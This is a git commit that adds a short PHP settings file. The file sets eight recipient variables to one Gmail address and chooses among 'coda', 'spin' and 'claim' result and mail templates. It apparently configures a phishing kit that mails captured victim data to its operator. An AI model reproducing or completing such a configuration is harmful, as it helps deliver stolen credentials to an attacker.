f259f00ad5610c4bda62f8a4fa176809928b189a
ZaaXxyZz <130498570+ZaaXxyZzModDev@users.noreply.github.com>
2023-08-07 17:22:47 +0700

    Add files via upload

---
+++ setting.php
@@ -0,0 +1,12 @@
+<?php
+$email1 = 'zaax6677@gmail.com';
+$email2 = 'zaax6677@gmail.com';
+$email3 = 'zaax6677@gmail.com';
+$email4 = 'zaax6677@gmail.com';
+$email5 = 'zaax6677@gmail.com';
+$email6 = 'zaax6677@gmail.com';
+$email7 = 'zaax6677@gmail.com';
+$email8 = 'zaax6677@gmail.com';
+$jenisress = $coda; //$coda, $spin, $claim
+$jenismail = $coda_mail; //$coda_mail, $spin_mail, $claim_mail
+?>
